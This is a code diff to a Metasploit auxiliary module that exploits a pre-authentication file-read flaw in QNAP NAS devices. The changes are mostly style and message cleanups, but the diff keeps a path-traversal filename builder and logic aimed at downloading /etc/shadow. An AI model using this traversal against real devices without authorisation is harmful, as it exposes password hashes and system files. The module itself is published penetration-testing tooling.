@@ -34,18 +34,20 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2019-7194'],
           ['CVE', '2019-7195'],
           ['EDB', '48531'],
-          ['URL', 'https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05'],
+          ['URL', 'https://infosecwriteups.com/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05'],
           ['URL', 'https://www.qnap.com/en-us/security-advisory/nas-201911-25'],
-          ['URL', 'https://github.com/Imanfeng/QNAP-NAS-RCE']
+          ['URL', 'https://github.com/Imanfeng/QNAP-NAS-RCE'],
+          ['ATT&CK', Mitre::Attack::Technique::T1003_008_ETC_PASSWD_AND_ETC_SHADOW]
         ],
         'DisclosureDate' => '2019-11-25', # Vendor advisory
         'Actions' => [
-          ['Download', 'Description' => 'Download the file at FILEPATH']
+          ['Download', { 'Description' => 'Download the file at FILEPATH' }]
         ],
         'DefaultAction' => 'Download',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'SideEffects' => [IOC_IN_LOGS]
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
         }
       )
     )
@@ -66,18 +68,18 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     unless res && res.code == 200 && (xml = res.get_xml_document)
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('Target does not appear to be a QNAP device')
     end
 
     info = %w[modelName version build patch].map do |node|
       xml.at("//#{node}").text
     end
 
-    vprint_status("QNAP #{info[0]} #{info[1..-1].join('-')} detected")
+    vprint_status("QNAP #{info[0]} #{info[1..].join('-')} detected")
 
-    return Exploit::CheckCode::Appears if info[2].to_i < 20191206
+    return Exploit::CheckCode::Appears("QNAP #{info[0]} build #{info[2]} is older than the patched build 20191206") if info[2].to_i < 20191206
 
-    Exploit::CheckCode::Detected
+    Exploit::CheckCode::Detected("QNAP #{info[0]} #{info[1..].join('-')} detected, but build is not confirmed vulnerable")
   end
 
   def run
@@ -105,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("File download successful, saved in #{path}")
 
-    print_good("File content:\n" + file_content) if datastore['PRINT']
+    print_good("File content:\n#{file_content}") if datastore['PRINT']
 
     return unless datastore['FILEPATH'] == '/etc/shadow'
 
@@ -158,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
         'album' => album_id,
         'a' => 'caption',
         'ac' => access_code,
-        'filename' => '.' + (file_path.start_with?('/') ? '/..' * datastore['DEPTH'] + file_path : '/' + file_path)
+        'filename' => ".#{file_path.start_with?('/') ? '/..' * datastore['DEPTH'] + file_path : "/#{file_path}"}"
       }
     })
 
